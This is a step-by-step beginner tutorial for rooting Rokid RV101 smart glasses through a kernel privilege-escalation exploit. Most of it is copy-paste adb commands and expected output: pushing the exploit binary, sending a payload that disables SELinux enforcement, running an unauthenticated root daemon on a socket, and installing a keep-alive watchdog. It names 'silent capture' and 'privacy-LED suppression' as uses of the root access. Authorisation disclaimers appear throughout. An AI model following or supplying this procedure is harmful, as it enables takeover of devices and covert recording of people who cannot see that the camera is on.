# From Zero: Getting Root on Rokid Glasses with Your Own Scripts (Beginner Tutorial)

> 中文版：[root-from-zero-guide.md](root-from-zero-guide.md)

> Version: 2026-09-08 · Applicable firmware: `1.22.009-20260710-150201` (vulnerable version)
> Audience: even a first-year computer-science beginner can follow along. Every term is explained in plain language first.
>
> ⚠️ **Only for security research on Rokid glasses that are "your own" or "authorised"**. Do not use this on other people's devices.
>
> 📌 This tutorial describes the "host adb + helper" route (now the **automatic fallback path**).
> The latest default mode is **Shizuku** (the glasses App runs the exploit itself as the shell user);
> see `docs/deploy.md` §9 and `reports/shizuku_integration_test_report.md`.

---

## 0. What this document is about

Out of the box, your Rokid glasses (model RV101 / RG-glasses) can only be operated over adb as an
"ordinary user" (called `shell` on Android, uid=2000), and many system files cannot be read or
written. This project provides a ready-made **local privilege escalation (LPE) program**
`ghostlock_rv101`, which exploits a kernel vulnerability in the firmware (GhostLock,
CVE-2026-43499) to turn your commands into **root (uid=0, the highest privilege)**.

This tutorial teaches you: **connect the glasses → run the scripts already in the project → get
root → verify root**. You do not need to know how to write an exploit; you only need to be able to
"copy-paste commands and read the output".

---

## 1. A few terms first (plain language)

| Term | Meaning |
|---|---|
| **adb** | Android Debug Bridge. A "command line" from your computer to the glasses; `adb shell` lets you issue commands |
| **shell / uid=2000** | The low-privilege identity adb gives you by default; a lot of things are invisible to it |
| **root / uid=0** | The highest privilege. Can read and write every file and change system settings |
| **SELinux Enforcing/Permissive** | Android's "access-control system". Enforcing = strict (blocks root from doing things), Permissive = lets it through. We want to switch it to Permissive |
| **LPE / exploit** | A local privilege-escalation attack program. `ghostlock_rv101` is the exploit |
| **kernel panic / reboot** | The attack sometimes crashes the kernel → the glasses reboot automatically. **This is normal**; just retry (it succeeds about half the time) |
| **payload** | The "script content" to run after the exploit succeeds. Our payload = turn off SELinux + start the persistent `root_daemon` |
| **root_daemon** | A small program that stays resident as root and listens on a UNIX socket; after that, you send it one line and it runs it for you as root |
| **helper** | The "robot that runs the exploit for you" written by the project: it runs the exploit, waits for the right moment to swap the payload, and reports the result |
| **UNIX socket** | A channel (file-based) for programs to talk to each other locally. `root_daemon.sock` is one |
| **Privilege escalation ≠ flashing** | We have not modified the firmware partitions; **root disappears after a reboot**, so the process has to be run again |

---

## 2. Pre-flight checklist (tick everything before you start)

### 2.1 Hardware and environment
- [ ] The Rokid glasses themselves + a USB cable
- [ ] A Windows computer (the environment this project was measured on; macOS/Linux work the same way with minor command changes)
- [ ] **adb** installed on the computer (Android SDK Platform-Tools), or make sure
      `platform-tools/adb.exe` exists under the project path
- [ ] The project folder (hereafter `專案/`) fully extracted, containing:
  - `deploy/root_bridge.sh`, `deploy/trigger_root_daemon.cmd`, `deploy/run_root.sh`
  - `deploy/get_root_now.sh` (one-click automatic version)
  - the exploit program **`ghostlock_rv101`** (an aarch64 file; if you do not have it, ask whoever manages this project)

### 2.2 Connect the glasses
1. Connect the glasses to the computer with the USB cable.
2. Open a "terminal". Two choices:
   - **Route A (recommended for beginners)**: **WSL / Ubuntu** or Git Bash on Windows (because the scripts are written in bash)
   - Route B: plain Windows PowerShell also works, but is only suitable for typing adb commands one at a time
3. Confirm the glasses are visible (if `adb` is not on PATH, substitute the full path;
   the project's default path is `/mnt/c/Users/<you>/AppData/Local/Android/Sdk/platform-tools/adb.exe`):

```bash
adb devices -l
```

**You should see:**
```
List of devices attached
<DEVICE_SERIAL>       device product:glasses model:RG_glasses device:glasses transport_id:1
```
- Seeing `device` = success. Seeing `offline` = unplug and replug, or allow USB debugging on the glasses.

### 2.3 Confirm the firmware is the "vulnerable version" (very important!)
```bash
adb shell getprop ro.build.fingerprint
```
You **must** see `1.22.009-20260710-150201`.
- If you see `1.25.012-...`: Rokid has already fixed the vulnerability, **this method will no longer work**; stop here.

### 2.4 Confirm the current "weak state" (for recording evidence)
```bash
adb shell "id; getenforce"
```
The expected output looks like this → it means you are not root yet and the access control is still on:
```
uid=2000(shell) gid=2000(shell) ... context=u:r:shell:s0
Enforcing
```

### 2.5 Confirm the exploit program is on the glasses
```bash
adb shell "ls -l /data/local/tmp/ghostlock_rv101"
```
- The file is visible = skip the following.
- Not visible = push the exploit up from the project first:
```bash
adb push ghostlock_rv101 /data/local/tmp/ghostlock_rv101
adb shell chmod 755 /data/local/tmp/ghostlock_rv101
```

---

## 3. Route A: the one-click automatic version (recommended for beginners, about 5–15 minutes)

The project's `deploy/get_root_now.sh` wraps up "start helper → send payload → wait → retry →
verify root" in one go, and it will also wait for the device to boot and start over automatically
after the exploit causes a reboot.

### Step A-1: open the script and change three variables (only those that differ in your environment)
`deploy/get_root_now.sh` itself only defines `ROOT_DIR`; **`ADB` and `SERIAL` come from the shared
configuration `deploy/env.sh`** (if `SERIAL` is not given, the first device from `adb devices` is
used automatically). To override them, just pass the environment variables:

```bash
ADB=<adb path> SERIAL=<glasses serial> bash deploy/get_root_now.sh
```
- `SERIAL`: change it to the serial number you saw in step 2.2
- `ROOT_DIR`: change it to the path where you put the project folder

### Step A-2: run it
```bash
cd 專案/deploy
bash get_root_now.sh
```
You can also leave it running in the background and watch the log:
```bash
tail -f deploy/get_root_now.log   # watch it from another terminal
```

### Step A-3: watch the output; you will probably see these messages
```
[helper] 不存在，執行 root_bridge.sh 重建並啟動   ← 機器人上工
[trigger] last.cmd 已寫入，等待 exploit...          ← payload 送出了
[wait] progress: exploit-attempt-1                  ← exploit 第 1 次嘗試
[wait] progress: ready                              ← exploit 成功了一半（要換 payload）
[wait] progress: waiting-done                       ← 核心攻擊進行中（約 2~3 分鐘）
[wait] last.out = OK（payload 已以 root 執行完畢）   ← 中了！
[verify] last.done 內容：uid=0(root) ...            ← 驗證
===== ROOT 已達成並驗證 =====                        ← 🎉
```

**The "normal bad news" you may see** (do not panic):
```
uptime 倒退 ... → 裝置已 reboot        ← exploit 把核心弄當機了，腳本會等開機重試
last.out = ERR:...                     ← 這次沒中，會自動再試（每輪最多 3 次）
```
The script restarts the whole thing up to 6 times automatically; past experience is that it usually
succeeds within 1–2 rounds.

---

## 4. Route B: the step-by-step manual version (to understand the principles)

For people who want to understand "what is actually happening". The result is the same as Route A.

### Step B-1: create the "bridge directory" and start the helper robot
The helper is a resident shell loop that watches `/data/local/tmp/ghostlock_bridge/last.cmd`:
```bash
cd 專案/deploy
bash root_bridge.sh
```
It automatically: creates the directory (777) → confirms the exploit is present → pushes root_daemon
→ writes and starts the helper.
**You should see:**
```
[1/4] 檢查 ghostlock_rv101 → [+] ghostlock_rv101 就緒
[2/4] 建立 bridge 目錄並放寬權限 ...
[2.5/4] 推送 root daemon ...
[3/4] 寫入 helper 常駐迴圈 ...
[4/4] 啟動 helper ...
完成。
```

### Step B-2: check that the helper is alive
```bash
adb shell "ps -A -o PID,ARGS | grep ghostlock_bridge_helper"
```
Seeing a line `sh /data/local/tmp/ghostlock_bridge_helper.sh` = OK.

### Step B-3: send the payload (tell the helper "run this for me once it succeeds")
The payload content is already written in `deploy/trigger_root_daemon.cmd`; in plain language it
says: "turn SELinux off to Permissive → start root_daemon → report completion".

```bash
# put the payload into the mailbox the helper watches (the filename must be last.cmd)
adb push deploy/trigger_root_daemon.cmd /data/local/tmp/ghostlock_bridge/last.cmd
adb shell chmod 666 /data/local/tmp/ghostlock_bridge/last.cmd
```
The helper reads it within a second and starts running the exploit.

### Step B-4: watch the progress (check them in turn from another terminal)
```bash
# the exploit's own log
adb shell tail -f /data/local/tmp/gl_run.log

# the helper's stage markers: started → exploit-attempt-N → ready → installed → waiting-done → done
adb shell cat /data/local/tmp/ghostlock_bridge/last.progress

# final result: OK or ERR:xxx
adb shell cat /data/local/tmp/ghostlock_bridge/last.out
```
- `[+] child is root!` appearing in `gl_run.log` = the exploit's kernel stage succeeded
- After `waiting-done` appears in `last.progress`, `last.out` becomes `OK` within about 1–3 minutes
- If the glasses suddenly reboot: wait for them to finish booting (`adb wait-for-device`) and
  **start again from B-1**. This is called a "normal failure"; the kernel attack itself crashes
  about half the time.

---

## 5. Verification: you really do have root

### 5.1 One-line verification (executed through the root_daemon socket)
```bash
cd 專案/deploy
bash run_root.sh 'id; getenforce'
```
**Seeing this = success:**
```
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

### 5.2 The raw method, no sugar and no explanation (if you want to see what the socket looks like)
```bash
echo 'id' | adb shell "nc -U /data/local/tmp/root_daemon.sock"
```

### 5.3 Hard evidence: read a root-only directory and leave a proof file
```bash
bash run_root.sh 'ls -ld /data/adb'        # root-only directory; being able to read it = root
bash run_root.sh 'mkdir -p /data/root_proof && ls -ld /data/root_proof'
```

---

## 6. What to do with this root afterwards

Once you have root, **any command** can be run with run_root.sh:
```bash
bash run_root.sh 'cat /sys/class/leds/white/brightness'   # read the LED
bash run_root.sh 'echo 0 > /sys/class/leds/white/brightness'  # turn the light off (for research)
bash run_root.sh 'ls /data'
```
The phone-side App (the ghostlock/LED features of Rokid Capture) also uses this socket
automatically, so you do not need to do anything else.

---

## 7. Frequently asked questions (FAQ)

**Q1: It has been running for ages without `OK`?**
Look at `last.progress`. If it is stuck at `exploit-attempt-N` for more than 10 minutes, or `FOPS
install failed` appears, just trigger it again: delete the payload and place it again (B-3), or
reboot the whole device and start again from B-1. This is the exploit's notorious "luck-based"
problem; a few more attempts usually do it.

**Q2: It keeps rebooting?**
Normal. The kernel attack succeeds about half the time. Route A retries automatically; with the
manual version, just run it again after the reboot completes. If it fails 10 times in a row, check
whether the firmware version in 2.3 really is still 1.22.009.

**Q3: Root disappeared after I rebooted?**
Normal! Both the helper and root_daemon live in memory and are gone after a reboot. Just run
B-1 → B-3 again (or the whole of Route A). This is a property of this method (it does not modify
the firmware partitions).

**Q4: The helper vanished for no reason (the log stops where it is)?**
The glasses have little memory (1.8GB), so the helper is sometimes killed by the system's OOM/lmkd.
Just re-run `bash root_bridge.sh` and trigger it once more.

**Q5: `run_root.sh` says it cannot connect to the socket?**
root_daemon is not running. Confirm that the command below outputs `1`:
```bash
adb shell "grep -c root_daemon.sock /proc/net/unix"
```
If it is not 1, the escalation has not succeeded yet (or a reboot has cleared it); go back and run
the process again.

**Q6: Can I use this exploit for something else?**
This project's purpose is "security research on your own devices". Once you have root, only do what
is within your research plan. Using someone else's device without authorisation, or using this to
secretly record other people's private activity, is illegal and violates research ethics.

---

## 8. Quick reference card (stick it next to your screen)

```bash
# show devices
adb devices -l
# check the firmware (must be 1.22.009)
adb shell getprop ro.build.fingerprint
# state before escalation
adb shell "id; getenforce"
# start the helper (needed after every reboot)
bash 專案/deploy/root_bridge.sh
# send the payload
adb push 專案/deploy/trigger_root_daemon.cmd /data/local/tmp/ghostlock_bridge/last.cmd
adb shell chmod 666 /data/local/tmp/ghostlock_bridge/last.cmd
# watch progress
adb shell cat /data/local/tmp/ghostlock_bridge/last.progress
adb shell cat /data/local/tmp/ghostlock_bridge/last.out
# verify root
bash 專案/deploy/run_root.sh 'id; getenforce'
```

### File map (where these files are in the project and what they do)
| File | Role |
|---|---|
| `ghostlock_rv101` | the exploit itself (must be placed in `/data/local/tmp/` on the glasses) |
| `deploy/root_bridge.sh` | starts the "helper robot" + checks the environment (one key) |
| `deploy/trigger_root_daemon.cmd` | the payload content (the root script to run after success) |
| `deploy/get_root_now.sh` | fully automatic version: helper→trigger→wait→retry→verify (beginners should use this) |
| `deploy/run_root.sh` | a small tool to run commands as root at any time afterwards |
| `deploy/root_daemon` (+ `.c`) | the persistent root service, listening on `/data/local/tmp/root_daemon.sock` |
| `/data/local/tmp/ghostlock_bridge/` | the mailbox for the helper and the payload (on the glasses) |
| `deploy/get_root_now.log` | the automatic version's log (look here first when something goes wrong) |

---

## 9. Responsibility and restoring

- **Only work on your own devices**. When the research is finished and you want to restore the
  factory state: simply `adb reboot` returns it to a clean Enforcing state (root is memory-level and
  is lost on reboot; no persistent backdoor is left behind).
- If you changed system files, restoring the factory settings (Settings → Backup & reset) will
  fully restore them.
- This project has a complete evidence and disclosure process (`RV101_Disclosure/`); if you want to
  publish anything, follow coordinated disclosure and do not post exploit details directly.

---

## After acquiring root: make it last the whole session (added 2026-09-13)

After a successful escalation, it is recommended to run one more script to install a **root daemon
keep-alive watchdog**:

```bash
SERIAL=<glasses serial> bash deploy/install_root_keepalive.sh
```

It does the following (without re-running the exploit and without rebooting):

1. Installs `/data/local/tmp/root_daemon_keepalive.sh`: it checks the listener every 20 seconds and
   automatically rebuilds the daemon if it crashes (measured recovery in **9–18 seconds**).
2. Sets the `oom_score_adj` of the daemon and the keep-alive to `-1000` (to avoid being reclaimed by
   the system's memory management).
3. Corrects `root_daemon.pid` (a stale PID often remains after a reboot).

> Why this matters: without root, **silent capture, privacy-LED suppression, WiFi media transfer and
> glasses-side ring control** all stop working. The phone-side "Settings → Capture & permissions →
> root status" shows the current state; if it really has failed and cannot be rebuilt automatically,
> it tells you directly which script to run (for example `deploy/root_bridge.sh 或 deploy/start_shizuku.sh`).

Note: the App's built-in engine selection is **automatic runtime probing** (if the Shizuku binder is
available it uses Shizuku, otherwise it uses the bridge helper), so you can run either
`start_shizuku.sh` or `root_bridge.sh` first; **there is no need to change the code or rebuild the
APK**.
